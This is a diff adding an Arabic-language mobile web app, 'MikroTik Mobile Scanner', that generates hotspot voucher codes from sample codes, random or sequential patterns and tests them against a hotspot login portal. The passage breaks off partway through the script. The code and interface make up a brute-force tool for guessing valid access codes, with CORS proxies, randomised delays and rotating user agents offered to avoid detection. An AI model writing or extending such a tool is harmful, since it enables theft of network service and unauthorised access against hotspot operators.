@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#0a0e1a">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <title>MikroTik Mobile Scanner</title>
+  <link rel="manifest" href="manifest.json">
+  <link rel="apple-touch-icon" href="icon-192.png">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap');
+
+    :root {
+      --bg-primary: #0a0e1a;
+      --bg-secondary: #111827;
+      --bg-card: #1f2937;
+      --bg-hover: #374151;
+      --accent: #3b82f6;
+      --accent-light: #60a5fa;
+      --accent-glow: rgba(59, 130, 246, 0.3);
+      --text-main: #f9fafb;
+      --text-secondary: #e5e7eb;
+      --text-muted: #9ca3af;
+      --success: #10b981;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --border: #374151;
+      --border-light: #4b5563;
+      --shadow: 0 4px 20px rgba(0,0,0,0.5);
+      --radius: 16px;
+      --radius-sm: 12px;
+      --safe-top: env(safe-area-inset-top, 20px);
+      --safe-bottom: env(safe-area-inset-bottom, 20px);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg-primary);
+      color: var(--text-main);
+      font-family: 'Inter', system-ui, sans-serif;
+      line-height: 1.6;
+      min-height: 100vh;
+      min-height: 100dvh;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Mobile optimizations */
+    input, button, select, textarea { font-size: 16px; }
+    @media (max-width: 480px) {
+      input, button, select, textarea { font-size: 16px; }
+    }
+
+    /* Header */
+    .app-header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: linear-gradient(180deg, var(--bg-primary) 0%, rgba(15,23,42,0.95) 100%);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      padding: var(--safe-top) 16px 12px;
+      border-bottom: 1px solid var(--border);
+    }
+    .app-header h1 {
+      font-size: 20px;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--text-main) 0%, var(--accent-light) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-align: center;
+    }
+    .app-header p {
+      font-size: 11px;
+      color: var(--text-muted);
+      text-align: center;
+      margin-top: 4px;
+    }
+
+    /* Bottom Navigation */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      z-index: 100;
+      background: linear-gradient(0deg, var(--bg-primary) 0%, rgba(15,23,42,0.95) 100%);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-top: 1px solid var(--border);
+      padding-bottom: var(--safe-bottom);
+      display: flex;
+      justify-content: space-around;
+      padding-top: 8px;
+    }
+    .nav-item {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      padding: 8px 4px;
+      color: var(--text-muted);
+      font-size: 11px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      border: none;
+      background: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .nav-item .icon { font-size: 22px; }
+    .nav-item.active { color: var(--accent-light); }
+    .nav-item.active .icon { filter: drop-shadow(0 0 8px var(--accent-glow)); }
+
+    /* Main Content */
+    .main-content {
+      padding: 16px;
+      padding-bottom: calc(80px + var(--safe-bottom));
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    /* Cards */
+    .card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px;
+      margin-bottom: 16px;
+      transition: all 0.3s;
+    }
+    .card:active { transform: scale(0.98); }
+    .card h2 {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--text-secondary);
+    }
+
+    /* Form Elements */
+    .form-group { margin-bottom: 16px; }
+    .form-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    input, select, textarea {
+      width: 100%;
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      color: var(--text-main);
+      padding: 14px 16px;
+      border-radius: var(--radius-sm);
+      font-size: 16px;
+      font-family: inherit;
+      transition: all 0.3s;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+    input:focus, select:focus, textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px var(--accent-glow);
+    }
+    textarea { font-family: 'Fira Code', monospace; resize: vertical; min-height: 100px; font-size: 14px; }
+    select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%239ca3af' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: left 12px center; padding-left: 40px; }
+
+    /* Buttons */
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: linear-gradient(135deg, var(--accent) 0%, #2563eb 100%);
+      color: white;
+      border: none;
+      padding: 14px 24px;
+      font-size: 15px;
+      font-weight: 700;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      transition: all 0.3s;
+      width: 100%;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+    }
+    .btn:active { transform: scale(0.96); }
+    .btn-secondary { background: var(--bg-hover); border: 1px solid var(--border); color: var(--text-secondary); }
+    .btn-success { background: linear-gradient(135deg, var(--success) 0%, #059669 100%); }
+    .btn-danger { background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%); }
+    .btn-warning { background: linear-gradient(135deg, var(--warning) 0%, #d97706 100%); }
+    .btn-sm { padding: 10px 16px; font-size: 13px; }
+    .btn-group { display: flex; gap: 8px; margin-top: 12px; }
+    .btn-group .btn { flex: 1; }
+
+    /* Templates */
+    .templates-scroll {
+      display: flex;
+      gap: 8px;
+      overflow-x: auto;
+      padding: 4px 0;
+      margin-bottom: 16px;
+      -webkit-overflow-scrolling: touch;
+      scrollbar-width: none;
+    }
+    .templates-scroll::-webkit-scrollbar { display: none; }
+    .template-chip {
+      flex-shrink: 0;
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      color: var(--text-muted);
+      padding: 10px 16px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      white-space: nowrap;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .template-chip:active { transform: scale(0.95); }
+    .template-chip.active {
+      background: linear-gradient(135deg, var(--accent) 0%, #2563eb 100%);
+      color: white;
+      border-color: var(--accent);
+    }
+
+    /* Progress */
+    .progress-container {
+      margin-top: 16px;
+      background: var(--bg-primary);
+      padding: 16px;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border);
+    }
+    .progress-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; font-weight: 600; }
+    .progress-bar-bg { background: var(--bg-card); height: 12px; border-radius: 6px; overflow: hidden; }
+    .progress-bar-fill {
+      background: linear-gradient(90deg, var(--accent), var(--success));
+      height: 100%;
+      width: 0%;
+      transition: width 0.4s ease;
+      border-radius: 6px;
+      position: relative;
+    }
+    .progress-bar-fill::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      animation: shimmer 2s infinite;
+    }
+    @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+    .progress-stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 12px; color: var(--text-muted); }
+
+    /* Console */
+    .console-log {
+      background: #020617;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 14px;
+      font-family: 'Fira Code', monospace;
+      font-size: 12px;
+      height: 200px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      color: #38bdf8;
+      line-height: 1.8;
+      -webkit-overflow-scrolling: touch;
+    }
+    .console-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .console-status { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--text-muted); }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); animation: pulse 2s infinite; }
+    .status-dot.inactive { background: var(--danger); animation: none; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+    /* Results List */
+    .results-list {
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      max-height: 300px;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+    .result-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 14px;
+      border-bottom: 1px solid var(--border);
+      font-family: 'Fira Code', monospace;
+      font-size: 13px;
+      transition: all 0.2s;
+    }
+    .result-item:last-child { border-bottom: none; }
+    .result-item.success { border-right: 3px solid var(--success); }
+    .result-item.failed { border-right: 3px solid var(--danger); }
+    .result-item:active { background: var(--bg-hover); }
+    .result-badge {
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-weight: 600;
+    }
+    .result-badge.success { background: rgba(16,185,129,0.2); color: var(--success); }
+    .result-badge.failed { background: rgba(239,68,68,0.2); color: var(--danger); }
+
+    /* Stats Grid */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .stat-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 16px;
+      text-align: center;
+    }
+    .stat-box-value { font-size: 28px; font-weight: 800; color: var(--accent-light); }
+    .stat-box-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; }
+
+    /* Toast */
+    .toast-container {
+      position: fixed;
+      top: calc(var(--safe-top) + 10px);
+      left: 16px;
+      right: 16px;
+      z-index: 10000;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      pointer-events: none;
+    }
+    .toast {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: var(--shadow);
+      animation: slideDown 0.3s ease;
+      pointer-events: auto;
+    }
+    .toast::before { content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 4px; }
+    .toast.success { border-right: 4px solid var(--success); }
+    .toast.error { border-right: 4px solid var(--danger); }
+    .toast.warning { border-right: 4px solid var(--warning); }
+    .toast.info { border-right: 4px solid var(--accent); }
+    @keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+    /* Hide/Show */
+    .hide { display: none !important; }
+    .tab-content { display: none; animation: fadeIn 0.3s ease; }
+    .tab-content.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg-primary); }
+    ::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 3px; }
+
+    /* Pull to refresh indicator */
+    .ptr-indicator {
+      text-align: center;
+      padding: 10px;
+      color: var(--text-muted);
+      font-size: 12px;
+      display: none;
+    }
+    .ptr-indicator.visible { display: block; }
+  </style>
+</head>
+<body>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<div class="app-header">
+  <h1>🔧 MikroTik Mobile</h1>
+  <p>فحص الكروت على الهاتف - يعمل بدون سيرفر</p>
+</div>
+
+<div class="main-content">
+
+  <!-- TAB 1: GENERATE -->
+  <div id="tab-generate" class="tab-content active">
+    <div class="stats-grid">
+      <div class="stat-box">
+        <div class="stat-box-value" id="statGenerated">0</div>
+        <div class="stat-box-label">مولد</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-box-value" id="statSaved">0</div>
+        <div class="stat-box-label">محفوظ</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>⚙️ توليد الكروت</h2>
+      <div class="form-group">
+        <label>طريقة التوليد</label>
+        <select id="genMode" onchange="toggleGenerationFields()">
+          <option value="pattern">التوليد الذكي</option>
+          <option value="random">العشوائي</option>
+          <option value="sequential">التسلسلي</option>
+        </select>
+      </div>
+
+      <div id="patternFields">
+        <div class="form-group">
+          <label>عينات (3 عينات):</label>
+          <textarea id="patternSamples" rows="3" placeholder="552502Ej20&#10;55250eF920&#10;5525heD490"></textarea>
+        </div>
+      </div>
+
+      <div id="randomFields" class="hide">
+        <div class="form-group">
+          <label>البادئة:</label>
+          <input type="text" id="prefix" placeholder="61">
+        </div>
+        <div class="form-group">
+          <label>الطول:</label>
+          <input type="number" id="totalLength" value="8" min="1" max="32">
+        </div>
+        <div class="form-group">
+          <label>الأحرف:</label>
+          <select id="charSet">
+            <option value="numeric">أرقام</option>
+            <option value="alpha">أحرف</option>
+            <option value="alphanumeric">أحرف+أرقام</option>
+          </select>
+        </div>
+      </div>
+
+      <div id="sequentialFields" class="hide">
+        <div class="form-group">
+          <label>البادئة:</label>
+          <input type="text" id="seqPrefix" placeholder="USER">
+        </div>
+        <div class="form-group">
+          <label>البداية:</label>
+          <input type="number" id="seqStart" value="1">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>العدد:</label>
+        <input type="number" id="genAmount" value="50" min="1" max="1000">
+      </div>
+
+      <button class="btn" onclick="executeGeneration()">🚀 توليد</button>
+      <div class="btn-group">
+        <button class="btn btn-secondary btn-sm" onclick="clearGeneration()">🗑️ مسح</button>
+        <button class="btn btn-success btn-sm" onclick="saveToDB()">💾 حفظ</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>📋 النتائج</h2>
+      <div class="form-group">
+        <input type="text" id="searchResults" placeholder="🔍 بحث..." oninput="renderGenerated()">
+      </div>
+      <div class="results-list" id="generatedList">
+        <div style="text-align:center; padding:30px; color:var(--text-muted);">ستظهر هنا...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TAB 2: SCAN -->
+  <div id="tab-test" class="tab-content">
+    <div class="card">
+      <h2>🔗 إعدادات الفحص</h2>
+
+      <div class="templates-scroll">
+        <button class="template-chip active" onclick="applyTemplate('mikrotik')">🏢 MikroTik</button>
+        <button class="template-chip" onclick="applyTemplate('1sh')">📡 1sh</button>
+        <button class="template-chip" onclick="applyTemplate('anet')">🌍 a.net</button>
+        <button class="template-chip" onclick="applyTemplate('custom')">⚙️ مخصص</button>
+      </div>
+
+      <div class="form-group">
+        <label>رابط البوابة:</label>
+        <input type="text" id="loginURL" value="http://10.0.0.1/login" placeholder="https://example.com/login">
+      </div>
+
+      <div class="form-group">
+        <label>الكروت للفحص:</label>
+        <textarea id="testList" rows="4" placeholder="كرت في كل سطر..."></textarea>
+      </div>
+
+      <div class="form-group">
+        <label>المهلة (ms):</label>
+        <input type="number" id="loginTimeOut" value="3000" min="500">
+      </div>
+
+      <div class="form-group">
+        <label>المصادقة:</label>
+        <select id="authType">
+          <option value="user_only">مستخدم فقط</option>
+          <option value="user_pass">مستخدم=مرور</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>طريقة الإرسال:</label>
+        <select id="httpMethod">
+          <option value="get">GET (آمن للهاتف)</option>
+          <option value="post">POST (يتطلب Proxy)</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label style="display:flex; align-items:center; gap:8px; cursor:pointer;">
+          <input type="checkbox" id="useProxy" checked style="width:auto; transform:scale(1.3);">
+          <span>استخدام CORS Proxy (مستحسن)</span>
+        </label>
+      </div>
+
+      <button class="btn" onclick="startScan()" id="startBtn">▶️ بدء الفحص</button>
+      <div class="btn-group">
+        <button class="btn btn-danger btn-sm" onclick="stopScan()" id="stopBtn" disabled>⏹️ إيقاف</button>
+        <button class="btn btn-secondary btn-sm" onclick="clearScanLog()">🗑️ مسح</button>
+      </div>
+
+      <div class="progress-container">
+        <div class="progress-header">
+          <span>التقدم</span>
+          <span id="progressPercent">0%</span>
+        </div>
+        <div class="progress-bar-bg"><div id="progressBar" class="progress-bar-fill"></div></div>
+        <div class="progress-stats">
+          <span id="progressLabel">جاهز...</span>
+          <span id="scanStats">0/0</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>📺 السجل</h2>
+      <div class="console-header">
+        <span style="font-size:12px; color:var(--text-muted); font-weight:600;">الأحداث</span>
+        <div class="console-status">
+          <span class="status-dot inactive" id="statusDot"></span>
+          <span id="statusText">غير نشط</span>
+        </div>
+      </div>
+      <div id="consoleLog" class="console-log">🎯 جاهز...
+
+💡 نصائح:
+• GET آمن ويعمل بدون Proxy
+• POST يحتاج Proxy للتجاوز
+• استخدم تأخير 3+ ثوانٍ</div>
+    </div>
+
+    <div class="card">
+      <h2>📊 نتائج الفحص</h2>
+      <div class="results-list" id="scanResults">
+        <div style="text-align:center; padding:20px; color:var(--text-muted);">ستظهر النتائج هنا...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TAB 3: SAVED -->
+  <div id="tab-saved" class="tab-content">
+    <div class="card">
+      <h2>💾 الكروت المحفوظة</h2>
+      <div class="form-group">
+        <input type="text" id="searchSaved" placeholder="🔍 بحث..." oninput="renderSaved()">
+      </div>
+      <div class="btn-group">
+        <button class="btn btn-secondary btn-sm" onclick="loadSavedToScan()">🔍 فحص</button>
+        <button class="btn btn-danger btn-sm" onclick="clearAllSaved()">🗑️ الكل</button>
+      </div>
+      <div class="results-list" id="savedList" style="margin-top:12px;">
+        <div style="text-align:center; padding:30px; color:var(--text-muted);">جاري التحميل...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TAB 4: SETTINGS -->
+  <div id="tab-settings" class="tab-content">
+    <div class="card">
+      <h2>⚙️ الإعدادات</h2>
+      <div class="form-group">
+        <label>CORS Proxy:</label>
+        <select id="proxyProvider">
+          <option value="corsproxy.io">corsproxy.io (موصى)</option>
+          <option value="cors.sh">cors.sh</option>
+          <option value="allorigins">allorigins.win</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>تأخير عشوائي:</label>
+        <select id="delayMode">
+          <option value="none">بدون</option>
+          <option value="light" selected>خفيف (1-3 ث)</option>
+          <option value="heavy">ثقيل (3-7 ث)</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>User-Agent:</label>
+        <select id="uaMode">
+          <option value="mobile" selected>هاتف (افتراضي)</option>
+          <option value="desktop">كمبيوتر</option>
+          <option value="random">عشوائي</option>
+        </select>
+      </div>
+      <button class="btn btn-secondary" onclick="clearAllData()">🗑️ مسح جميع البيانات</button>
+    </div>
+
+    <div class="card">
+      <h2>📱 حول التطبيق</h2>
+      <p style="color:var(--text-muted); font-size:14px; line-height:1.8;">
+        <strong>الإصدار:</strong> 2.0 Mobile<br>
+        <strong>التخزين:</strong> IndexedDB (محلي)<br>
+        <strong>الـ Proxy:</strong> corsproxy.io<br>
+        <strong>الوضع:</strong> PWA (يعمل Offline)<br><br>
+        💡 <strong>نصيحة:</strong> أضف التطبيق للشاشة الرئيسية لتجربة أفضل.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Bottom Navigation -->
+<nav class="bottom-nav">
+  <button class="nav-item active" onclick="switchTab('tab-generate', this)">
+    <span class="icon">🎫</span>
+    <span>توليد</span>
+  </button>
+  <button class="nav-item" onclick="switchTab('tab-test', this)">
+    <span class="icon">🔍</span>
+    <span>فحص</span>
+  </button>
+  <button class="nav-item" onclick="switchTab('tab-saved', this)">
+    <span class="icon">💾</span>
+    <span>محفوظ</span>
+  </button>
+  <button class="nav-item" onclick="switchTab('tab-settings', this)">
+    <span class="icon">⚙️</span>
+    <span>إعدادات</span>
+  </button>
+</nav>
+
+<script>// ==================== CONFIG ====================
+const CONFIG = {
+  proxies: {
+    'corsproxy.io': 'https://corsproxy.io/?',
+    'cors.sh': 'https://proxy.cors.sh/',
+    'allorigins': 'https://api.allorigins.win/raw?url='
+  },
+  userAgents: [
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+  ]
+};
+
+// ==================== STATE ====================
+const AppState = {
+  generatedCards: [],
+  isScanning: false,
+  shouldStop: false,
+  scanQueue: [],
+  scanIndex: 0,
+  scanResults: { success: 0, failed: 0 }
+};
+
+// ==================== INDEXEDDB ====================
+class CardDatabase {
+  constructor() {
+    this.db = null;
+    this.dbName = 'MikroTikScannerDB';
+    this.version = 1;
+  }
+
+  async init() {
+    return new Promise((resolve, reject) => {
+      const request = indexedDB.open(this.dbName, this.version);
+      request.onerror = () => reject(request.error);
+      request.onsuccess = () => { this.db = request.result; resolve(); };
+      request.onupgradeneeded = (event) => {
+        const db = event.target.result;
+        if (!db.objectStoreNames.contains('cards')) {
+          const store = db.createObjectStore('cards', { keyPath: 'id', autoIncrement: true });
+          store.createIndex('card_number', 'card_number', { unique: true });
+          store.createIndex('status', 'status', { unique: false });
+          store.createIndex('created_at', 'created_at', { unique: false });
+        }
+        if (!db.objectStoreNames.contains('scan_logs')) {
+          db.createObjectStore('scan_logs', { keyPath: 'id', autoIncrement: true });
+        }
+      };
+    });
+  }
+
+  async addCards(cards) {
+    return new Promise((resolve, reject) => {
+      const tx = this.db.transaction('cards', 'readwrite');
+      const store = tx.objectStore('cards');
+      let added = 0;
+      cards.forEach(card => {
+        const req = store.add({
+          card_number: card,
+          status: 'pending',
+          created_at: new Date().toISOString(),
+          last_tested: null,
+          success_count: 0,
+          fail_count: 0
+        });
+        req.onsuccess = () => added++;
+        req.onerror = () => {};
+      });
+      tx.oncomplete = () => resolve(added);
+      tx.onerror = () => reject(tx.error);
+    });
+  }
+
+  async getCards(status = null) {
+    return new Promise((resolve, reject) => {
+      const tx = this.db.transaction('cards', 'readonly');
+      const store = tx.objectStore('cards');
+      const request = status ? store.index('status').getAll(status) : store.getAll();
+      request.onsuccess = () => resolve(request.result);
+      request.onerror = () => reject(request.error);
+    });
+  }
+
+  async updateCard(cardNumber, updates) {
+    return new Promise((resolve, reject) => {
+      const tx = this.db.transaction('cards', 'readwrite');
+      const store = tx.objectStore('cards');
+      const idx = store.index('card_number');
+      const req = idx.get(cardNumber);
+      req.onsuccess = () => {
+        const card = req.result;
+        if (card) {
+          Object.assign(card, updates, { last_tested: new Date().toISOString() });
+          store.put(card);
+        }
+        resolve();
+      };
+      req.onerror = () => reject(req.error);
+    });
+  }
+
+  async deleteAllCards() {
+    return new Promise((resolve, reject) => {
+      const tx = this.db.transaction('cards', 'readwrite');
+      const store = tx.objectStore('cards');
+      const req = store.clear();
+      req.onsuccess = () => resolve();
+      req.onerror = () => reject(req.error);
+    });
+  }
+
+  async deleteCard(id) {
+    return new Promise((resolve, reject) => {
+      const tx = this.db.transaction('cards', 'readwrite');
+      const store = tx.objectStore('cards');
+      const req = store.delete(id);
+      req.onsuccess = () => resolve();
+      req.onerror = () => reject(req.error);
+    });
+  }
+
+  async getStats() {
+    const cards = await this.getCards();
+    return {
+      total: cards.length,
+      success: cards.filter(c => c.status === 'success').length,
+      failed: cards.filter(c => c.status === 'failed').length,
+      pending: cards.filter(c => c.status === 'pending').length
+    };
+  }
+}
+
+const db = new CardDatabase();
+
+// ==================== UI UTILITIES ====================
+function showToast(msg, type = 'info') {
+  const container = document.getElementById('toastContainer');
+  const toast = document.createElement('div');
+  toast.className = `toast ${type}`;
+  const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
+  toast.innerHTML = `<span>${icons[type] || 'ℹ️'}</span><span>${msg}</span>`;
+  container.appendChild(toast);
+  setTimeout(() => toast.remove(), 3000);
+}
+
+function log(msg, type = 'info') {
+  const consoleLog = document.getElementById('consoleLog');
+  const timestamp = new Date().toLocaleTimeString('ar-SA');
+  const icons = { info: 'ℹ️', success: '✅', error: '❌', warning: '⚠️' };
+  consoleLog.textContent += `\n[${timestamp}] ${icons[type] || 'ℹ️'} ${msg}`;
+  consoleLog.scrollTop = consoleLog.scrollHeight;
+}
+
+function updateStatus(active) {
+  const dot = document.getElementById('statusDot');
+  const text = document.getElementById('statusText');
+  if (active) {
+    dot.classList.remove('inactive');
+    text.textContent = 'جاري...';
+    text.style.color = 'var(--success)';
+  } else {
+    dot.classList.add('inactive');
+    text.textContent = 'غير نشط';
+    text.style.color = 'var(--text-muted)';
+  }
+}
+
+function updateProgress(current, total) {
+  const pct = Math.round((current / total) * 100);
+  document.getElementById('progressBar').style.width = pct + '%';
+  document.getElementById('progressPercent').textContent = pct + '%';
+  document.getElementById('progressLabel').textContent = `${current} من ${total}`;
+  document.getElementById('scanStats').textContent = `${AppState.scanResults.success}✓ ${AppState.scanResults.failed}✗`;
+}
+
+function switchTab(tabId, btn) {
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+  document.getElementById(tabId).classList.add('active');
+  if (btn) btn.classList.add('active');
+  if (tabId === 'tab-saved') renderSaved();
+}
+
+// ==================== GENERATION ====================
+function toggleGenerationFields() {
+  const mode = document.getElementById('genMode').value;
+  document.getElementById('patternFields').classList.toggle('hide', mode !== 'pattern');
+  document.getElementById('randomFields').classList.toggle('hide', mode !== 'random');
+  document.getElementById('sequentialFields').classList.toggle('hide', mode !== 'sequential');
+}
+
+function detectPattern(cards) {
+  const len = cards[0].length;
+  let pattern = [];
+  for (let i = 0; i < len; i++) {
+    const chars = cards.map(c => c[i]).filter(Boolean);
+    if (!chars.length) continue;
+    const allSame = chars.every(c => c === chars[0]);
+    if (allSame) pattern.push({ type: 'fixed', value: chars[0] });
+    else {
+      const isDigit = chars.every(c => /\d/.test(c));
+      const isLower = chars.every(c => /[a-z]/.test(c));
+      const isUpper = chars.every(c => /[A-Z]/.test(c));
+      if (isDigit) pattern.push({ type: 'rand_digit' });
+      else if (isLower) pattern.push({ type: 'rand_lower' });
+      else if (isUpper) pattern.push({ type: 'rand_upper' });
+      else pattern.push({ type: 'rand_mix' });
+    }
+  }
+  return pattern;
+}
+
+function generateFromPattern(pattern) {
+  return pattern.map(p => {
+    if (p.type === 'fixed') return p.value;
+    if (p.type === 'rand_digit') return Math.floor(Math.random() * 10);
+    if (p.type === 'rand_lower') return String.fromCharCode(97 + Math.floor(Math.random() * 26));
+    if (p.type === 'rand_upper') return String.fromCharCode(65 + Math.floor(Math.random() * 26));
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    return chars.charAt(Math.floor(Math.random() * chars.length));
+  }).join('');
+}
+
+function executeGeneration() {
+  const mode = document.getElementById('genMode').value;
+  const amount = Math.min(parseInt(document.getElementById('genAmount').value) || 50, 1000);
+  const cards = new Set();
+
+  try {
+    if (mode === 'pattern') {
+      const samples = document.getElementById('patternSamples').value.trim().split('\n').map(s => s.trim()).filter(Boolean);
+      if (samples.length < 2) { showToast('أدخل عينتين على الأقل', 'warning'); return; }
+      const pattern = detectPattern(samples);
+      while (cards.size < amount) cards.add(generateFromPattern(pattern));
+    } else if (mode === 'random') {
+      const prefix = document.getElementById('prefix').value.trim();
+      const totalLen = Math.min(parseInt(document.getElementById('totalLength').value) || 8, 32);
+      const needed = totalLen - prefix.length;
+      if (needed <= 0) { showToast('البادئة طويلة', 'error'); return; }
+      const sets = { numeric: '0123456789', alpha: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', alphanumeric: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' };
+      const chars = sets[document.getElementById('charSet').value] || sets.numeric;
+      while (cards.size < amount) {
+        let part = '';
+        for (let j = 0; j < needed; j++) part += chars.charAt(Math.floor(Math.random() * chars.length));
+        cards.add(prefix + part);
+      }
+    } else if (mode === 'sequential') {
+      const prefix = document.getElementById('seqPrefix').value.trim();
+      const start = parseInt(document.getElementById('seqStart').value) || 1;
+      for (let i = 0; i < amount; i++) cards.add(prefix + (start + i).toString().padStart(3, '0'));
+    }
+
+    AppState.generatedCards = Array.from(cards);
+    renderGenerated();
+    document.getElementById('statGenerated').textContent = AppState.generatedCards.length;
+    showToast(`تم توليد ${cards.size} كرت`, 'success');
+  } catch (e) { showToast('خطأ: ' + e.message, 'error'); }
+}
+
+function renderGenerated() {
+  const list = document.getElementById('generatedList');
+  const search = document.getElementById('searchResults').value.trim().toLowerCase();
+  const filtered = search ? AppState.generatedCards.filter(c => c.toLowerCase().includes(search)) : AppState.generatedCards;
+
+  if (!filtered.length) { list.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);">لا توجد نتائج</div>'; return; }
+  list.innerHTML = filtered.map(card => `
